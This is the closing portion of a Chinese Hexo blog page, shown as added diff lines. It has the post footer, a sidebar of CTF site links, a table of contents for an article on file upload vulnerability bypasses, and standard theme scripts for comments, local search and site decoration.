+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/10/go语言整数溢出/" rel="next" title="go语言整数溢出">
+                <i class="fa fa-chevron-left"></i> go语言整数溢出
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/13/JavisOJ-WEB之旅/" rel="prev" title="JavisOJ WEB之旅">
+                JavisOJ WEB之旅 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">gtfly</p>
+              <p class="site-description motion-element" itemprop="description">轻描时光漫长低唱语焉不详.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">148</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.bugku.com/login?next=challenges" title="Bugku" target="_blank">Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://new.bugku.com/" title="new Bugku" target="_blank">new Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.linkedbyx.com/home" title="X计划平台" target="_blank">X计划平台</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.shiyanbar.com/ctf/practice" title="实验吧" target="_blank">实验吧</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf.jasec.cn/index.php?page=login" title="Jactf" target="_blank">Jactf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jarvisoj.com/login" title="Javis" target="_blank">Javis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cgctf.nuptsast.com/challenges#Web" title="CGctf" target="_blank">CGctf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com/" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.ssleye.com/" title="ctf在线工具" target="_blank">ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.194nb.com/" title="aman ctf在线工具" target="_blank">aman ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ctfwp.com/" title="ctfwp" target="_blank">ctfwp</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是文件上传漏洞"><span class="nav-number">1.</span> <span class="nav-text">什么是文件上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传-Multipart-form-data"><span class="nav-number">2.</span> <span class="nav-text">文件上传-Multipart/form-data</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端javascript-检测-通常为检测文件扩展名"><span class="nav-number">3.</span> <span class="nav-text">客户端javascript 检测(通常为检测文件扩展名)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端检测绕过"><span class="nav-number">4.</span> <span class="nav-text">服务端检测绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-服务端MIME类型检测-检测Content-Type-内容"><span class="nav-number">4.1.</span> <span class="nav-text">0x01.服务端MIME类型检测(检测Content-Type 内容)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-0x00截断"><span class="nav-number">4.2.</span> <span class="nav-text">0x02.0x00截断</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#上传路径可控"><span class="nav-number">4.2.1.</span> <span class="nav-text">上传路径可控</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#move-uploaded-file-（CVE-2015-2348）"><span class="nav-number">4.2.2.</span> <span class="nav-text">move_uploaded_file() （CVE-2015-2348）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-Apache文件解析特性"><span class="nav-number">4.3.</span> <span class="nav-text">0x03.Apache文件解析特性</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#多后缀名"><span class="nav-number">4.3.1.</span> <span class="nav-text">多后缀名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#罕见后缀"><span class="nav-number">4.3.2.</span> <span class="nav-text">罕见后缀</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#htaccess"><span class="nav-number">4.3.3.</span> <span class="nav-text">.htaccess</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-条件竞争"><span class="nav-number">4.4.</span> <span class="nav-text">0x04.条件竞争</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-后缀名大小写绕过"><span class="nav-number">4.5.</span> <span class="nav-text">0x05.后缀名大小写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-在后缀名后加空格"><span class="nav-number">4.6.</span> <span class="nav-text">0x06.在后缀名后加空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-Windows解析特性"><span class="nav-number">4.7.</span> <span class="nav-text">0x07.Windows解析特性</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#文件后缀的点"><span class="nav-number">4.7.1.</span> <span class="nav-text">文件后缀的点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DATA"><span class="nav-number">4.7.2.</span> <span class="nav-text">::$DATA</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x08-上传后被删除"><span class="nav-number">4.8.</span> <span class="nav-text">0x08.上传后被删除</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#方法一-条件竞争"><span class="nav-number">4.8.1.</span> <span class="nav-text">方法一.条件竞争</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法二-函数特性"><span class="nav-number">4.8.2.</span> <span class="nav-text">方法二.函数特性</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x09-上传图片马"><span class="nav-number">4.9.</span> <span class="nav-text">0x09.上传图片马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#文件头检测"><span class="nav-number">4.9.1.</span> <span class="nav-text">文件头检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二次渲染"><span class="nav-number">4.9.2.</span> <span class="nav-text">二次渲染</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        ﻿<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gtfly</span>
+
+ <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+ <script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/16/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已存在 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+ setInterval("createtime()",250);
+ </script>
+
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+-->
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </div></footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9Pgz8ir0b40IXQ5V3bjRc8m0-gzGzoHsz',
+        appKey: 'VCCuCSQHpPqX3hmOh0PlmfXu',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+ <!-- ҳ����С���� -->
+ <script type="text/javascript" src="/js/src/love.js"></script>
+
+  
+  
+  <!--������ƭ-->
+ <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://myqinshimoon.github.io/background.jpg");
+  </script>
+
+
+</body>
+</html>
